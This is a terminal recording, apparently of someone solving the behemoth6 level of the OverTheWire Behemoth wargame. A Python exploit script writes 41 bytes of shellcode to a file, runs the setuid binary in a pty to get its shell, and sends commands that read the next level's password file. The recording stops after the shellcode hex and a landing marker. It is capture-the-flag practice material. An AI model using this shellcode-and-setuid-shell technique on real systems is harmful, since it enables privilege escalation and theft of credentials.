[0.042, "o", "import os, pty, tty, time, select, fcntl, termios, subprocess\r\r\n\r\r\n# behemoth6: popen(\"/behemoth/behemoth6_reader\",\"r\"), fread(10) and strcmp with\r\r\n# \"HelloKitty\"; on success it setreuid(euid,euid) and execl(\"/bin/sh\").\r\r\n# The reader mmaps shellcode.txt with PROT_READ|WRITE|EXEC and calls it, so our\r\r\n# shellcode must write \"HelloKitty\" to stdout. The reader refuses any file that\r\r\n# contains byte 0x0b (vertical tab).\r\r\n#\r\r\n# The shellcode is not hand-typed here: it was written in /tmp/b6.asm and\r\r\n# assembled with nasm (nasm -f elf32 /tmp/b6.asm -o /tmp/b6.o;\r\r\n# objcopy -O binary --only-section=.text /tmp/b6.o /tmp/b6.bin).\r\r\nsc = open(\"/tmp/b6.bin\", \"rb\").read()\r\r\nprint(\"shellcode (%d bytes): %s\" % (len(sc), sc.hex()), flush=True)\r\r\nassert b\"\\x0b\" not in sc, \"the reader refuses any file containing 0x0b\"\r\r\n\r\r\nwork = \"/tmp/b6work\"\r\r\nos.makedirs(work, exist_ok=True)\r\r\nos.chmod(work, 0o777)\r\r\nos.chdir(work)\r\r\nopen(\"shellcode.txt\", \"wb\").write(sc)\r\r\nprint(\"wrote %s/shellcode.txt (%d bytes)\" % (work, len(sc)), flush=True)\r\r\n\r\r\n# Run behemoth6 on a raw pty: after strcmp succeeds it execs /bin/sh, and we\r\r\n# want that shell interactive so we can read the next password.\r\r\nmaster, slave = pty.openpty()\r\r\ntty.setraw(slave)\r\r\npid = os.fork()\r\r\nif pid == 0:\r\r\n    os.close(master)\r\r\n    os.setsid()\r\r\n    fcntl.ioctl(slave, termios.TIOCSCTTY, 0)\r\r\n    os.dup2(slave, 0); os.dup2(slave, 1); os.dup2(slave, 2)\r\r\n    if slave > 2:\r\r\n        os.close(slave)\r\r\n    os.execve(b\"/behemoth/behemoth6\", [b\"/behemoth/behemoth6\"], {})\r\r\nos.close(slave)\r\r\nprint(\"B6\" + \"LAND\", flush=True)\r\r\n\r\r\ntime.sleep(1.5)\r\r\nos.write(master, b\"id\\n\")\r\r\ntime.sleep(0.5)\r\r\nos.write(master, b\"cat /etc/behemoth_pass/behemoth7\\n\")\r\r\ntime.sleep(0.8)\r\r\nos.write(master, b\"exit\\n\")\r\r\n\r\r\nout = b\"\"\r\r\nend = time.time() + 8\r\r\nwhile time.time() < end:\r\r\n    r, _, _ = select.select([master], [], [], 0.2)\r\r\n    if not r:\r\r\n        continue\r\r\n    try:\r\r\n        data = os.read(master, 4096)\r\r\n    except OSError:\r\r\n        break\r\r\n    if not data:\r\r\n        break\r\r\n    out += data\r\r\nos.write(1, out)\r\r\ntry:\r\r\n    os.waitpid(pid, 0)\r\r\nexcept ChildProcessError:\r\r\n    pass\r\r\nprint(\"\\nB6\" + \"DONE\", flush=True)\r\r\n\r\r\n"]
[0.008, "o", "\u001b]3008;end=a2a313a1-3ee4-4eb6-b225-22bdce28f66d;exit=success\u001b\\\u001b]3008;start=a3c9587c-cac4-421b-ac6a-cd2c9ba3654a;type=shell;machineid=ec21caf08cfdfe937b9cee1512c61281;user=behemoth6;hostname=gibson-0;bootid=7b3c318e-e0a3-4e72-9221-931949256b86;pid=3;cwd=/home/behemoth6\u001b\\\u001b[?2004h\u001b]0;behemoth6@behemoth: ~\u0007behemoth6@behemoth:~$ python3 /tmp/e_behemoth6.py\r\r\n\u001b[?2004l\r\u001b]3008;start=4dd1f55a-f307-417d-8559-bd70936a8401;type=command;machineid=ec21caf08cfdfe937b9cee1512c61281;user=behemoth6;hostname=gibson-0;bootid=7b3c318e-e0a3-4e72-9221-931949256b86;pid=3;cwd=/home/behemoth6\u001b\\shellcode (41 bytes): 31c0506874790000686f4b69746848656c6c89e131db4331d2b20a31c0b004cd8031c0b00131dbcd80\r\r\nwrote /tmp/b6work/shellcode.txt (41 bytes)\r\r\nB6LAND\r\r\n"]
